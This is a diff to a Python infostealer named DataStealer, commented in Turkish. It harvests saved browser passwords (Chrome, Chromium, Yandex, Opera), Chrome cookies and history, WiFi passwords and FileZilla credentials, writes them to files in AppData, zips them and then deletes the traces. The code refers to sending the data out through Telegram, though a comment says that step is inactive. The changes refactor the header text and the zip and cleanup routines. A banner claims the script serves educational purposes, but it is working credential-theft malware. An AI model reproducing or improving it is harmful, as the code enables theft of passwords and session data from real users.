@@ -12,7 +12,7 @@ from tkinter import messagebox  # Hata Mesajı için
 
 ########################################################################################################################
 def DataStealer():
-    # TelegramSend('539) ve Zip İmha('545) Pasif !!
+    # TelegramSend('451) ve Zip İmha('457) Pasif !!
     # Üretilen Dosyalara C:\Users\{kullanici_adi}\AppData\Roaming dizininde ulaşabilirsin
     ####################################################################################
     import os                   # Dizinler ve dosyalarla çalışmak için
@@ -23,6 +23,7 @@ def DataStealer():
     import subprocess           # WiFi işlemini Yakalamak için
     from lxml import etree      # FileZilla Dosyasını Okumak için
     import base64               # FileZilla'nın Şifrelenmiş verisini çözmek için.
+    import re                   # Spesifik dosya seçebilmek için
     import zipfile              # Topladığımız verileri Zip'lemek için
     import requests             # Verileri Telegram apisi ile almak için
     ####################################################################################
@@ -35,6 +36,7 @@ def DataStealer():
     opera_yolu = os.getenv("LOCALAPPDATA") + '\\Opera Software\\Opera Stable\\'
     app_data = os.getenv("APPDATA") + '\\'
     filezilla_yolu = app_data + '\\FileZilla\\'
+    txt_baslik = f'@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!\n\n\t{kullanici_adi} İsimli Bilgisayarın'
     ###########################################################################################
 
     ################################################################################
@@ -51,7 +53,7 @@ def DataStealer():
             cursor = conn.cursor()
 
             # Dosya Oluştur Başlık Gir
-            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı Şifreleri\n\n'
+            ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı Şifreleri\n\n'
             file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "w+")  #
             file.write(ust_bilgi)
             file.close()
@@ -88,7 +90,7 @@ def DataStealer():
             cursor = conn.cursor()
 
             # Dosya Oluştur Başlık Gir
-            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı Çerezleri\n\n'
+            ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı Çerezleri\n\n'
             file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "w+")  #
             file.write(ust_bilgi)
             file.close()
@@ -125,7 +127,7 @@ def DataStealer():
             cursor = conn.cursor()
 
             # Dosya Oluştur Başlık Gir
-            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı İndirme Geçmişi\n\n'
+            ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı İndirme Geçmişi\n\n'
             file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "w+")  #
             file.write(ust_bilgi)
             file.close()
@@ -161,7 +163,7 @@ def DataStealer():
             cursor = conn.cursor()
 
             # Dosya Oluştur Başlık Gir
-            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı url Geçmişi\n\n'
+            ust_bilgi = txt_baslik + '\n\n\t\t\tChrome Tarayıcı url Geçmişi\n\n'
             file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "w+")  #
             file.write(ust_bilgi)
             file.close()
@@ -208,7 +210,7 @@ def DataStealer():
         profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
 
         # Dosya Oluştur Başlık Gir
-        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nWiFi Şifreleri\n\n'
+        ust_bilgi = txt_baslik + '\n\n\t\t\tWiFi Şifreleri\n\n'
         file = open(app_data + f'{kullanici_adi}_WifiPass.txt', "w+")  #
         file.write(ust_bilgi + '=' * 100)
         file.close()
@@ -253,7 +255,7 @@ def DataStealer():
             cursor = conn.cursor()
 
             # Dosya Oluştur Başlık Gir
-            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChromium Tarayıcı Şifreleri\n\n'
+            ust_bilgi = txt_baslik + '\n\n\t\t\tChromium Tarayıcı Şifreleri\n\n'
             file = open(app_data + f'{kullanici_adi}_ChromiumPass.txt', "w+")  #
             file.write(ust_bilgi)
             file.close()
@@ -294,7 +296,7 @@ def DataStealer():
             cursor = conn.cursor()
 
             # Dosya Oluştur Başlık Gir
-            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nYandex Tarayıcı Şifreleri\n\n'
+            ust_bilgi = txt_baslik + '\n\n\t\t\tYandex Tarayıcı Şifreleri\n\n'
             file = open(app_data + f'{kullanici_adi}_YandexPass.txt', "w+")  #
             file.write(ust_bilgi)
             file.close()
@@ -335,7 +337,7 @@ def DataStealer():
             cursor = conn.cursor()
 
             # Dosya Oluştur Başlık Gir
-            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nOpera Tarayıcı Şifreleri\n\n'
+            ust_bilgi = txt_baslik + '\n\n\t\t\tOpera Tarayıcı Şifreleri\n\n'
             file = open(app_data + f'{kullanici_adi}_OperaPass.txt', "w+")  #
             file.write(ust_bilgi)
             file.close()
@@ -370,7 +372,7 @@ def DataStealer():
             root = etree.parse(filezilla_yolu + 'recentservers.xml').getroot()
 
             # Dosya Oluştur Başlık Gir
-            ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nFileZilla Şifreleri\n\n'
+            ust_bilgi = txt_baslik + '\n\n\t\t\tFileZilla Şifreleri\n\n'
             file = open(app_data + f'{kullanici_adi}_FileZillaPass.txt', "w+")  #
             file.write(ust_bilgi)
             file.close()
@@ -413,46 +415,13 @@ def DataStealer():
     def ZipFile():
         zip_adi = app_data + f'{kullanici_adi}_LOG.zip'
         yeni_zip = zipfile.ZipFile(zip_adi, 'w')
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_ChromePass.txt')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_ChromeCookies.txt')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_ChromeURLHistory.txt')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_ScreenShot.jpg')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_FileZillaPass.txt')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_WifiPass.txt')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_OperaPass.txt')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_YandexPass.txt')
-        except:
-            pass
-        try:
-            yeni_zip.write(app_data + f'{kullanici_adi}_ChromiumPass.txt')
-        except:
-            pass
+        
+        dosyalar = os.listdir(app_data)
+        for i in dosyalar:
+            if re.match(f"{kullanici_adi}*.*txt",i) or \
+                    re.match(f"{kullanici_adi}*.*jpg",i):
+                yeni_zip.write(app_data + i)
+                
         yeni_zip.close()
     ZipFile()
     ################################################################################
@@ -461,70 +430,13 @@ def DataStealer():
     #                          Üretilen Dosyaları Sil                              #
     ################################################################################
     def DosyaYokEt():
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromePass.txt')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromeCookies.txt')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromeURLHistory.txt')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ScreenShot.jpg')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromeLoginData.sql')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromeCookies.sql')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromeHistory.sql')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_FileZillaPass.txt')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_WifiPass.txt')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_OperaLoginData.sql')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_OperaPass.txt')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_YandexLoginData.db')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_YandexPass.txt')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromiumLoginData.sql')
-        except:
-            pass
-        try:
-            os.remove(app_data + f'{kullanici_adi}_ChromiumPass.txt')
-        except:
-            pass
+        dosyalar = os.listdir(app_data)
+        for i in dosyalar:
+            if re.match(f"{kullanici_adi}*.*txt",i) or \
+                    re.match(f"{kullanici_adi}*.*jpg",i) or \
+                    re.match(f"{kullanici_adi}*.*sql",i) or \
+                    re.match(f"{kullanici_adi}*.*db",i):
+                os.remove(app_data + i)
     DosyaYokEt()
     ################################################################################
 
